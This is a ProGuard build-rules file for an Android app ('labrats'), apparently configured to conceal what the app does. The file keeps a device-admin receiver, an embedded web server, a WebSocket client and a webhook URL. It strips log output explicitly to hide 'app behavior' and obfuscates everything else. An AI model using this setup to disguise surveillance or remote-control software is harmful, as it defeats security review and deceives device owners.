# Optimization Rules for Stealth and Performance

# Keep NanoHTTPD (required for the web server to function)
-keep class fi.iki.elonen.** { *; }

# Keep WebSocket client
-keep class org.java_websocket.** { *; }
-keep class com.labs.labrats.** { *; }

# Keep Gson
-keep class com.google.gson.** { *; }
-keepattributes Signature
-keepattributes *Annotation*

# Allow full obfuscation of our internal logic
-keepclassmembers class com.labs.labrats.BuildConfig {
    public static final String WEBHOOK_URL;
}

# Keep service and receiver classes
-keep class * extends android.app.Service { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }

# Strip debug log messages in release builds
# This removes plain-text strings that reveal app behavior
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

# Obfuscate everything except entry points
-optimizationpasses 5
-allowaccessmodification
-repackageclasses 'com.d'
-flattenpackagehierarchy
-overloadaggressively
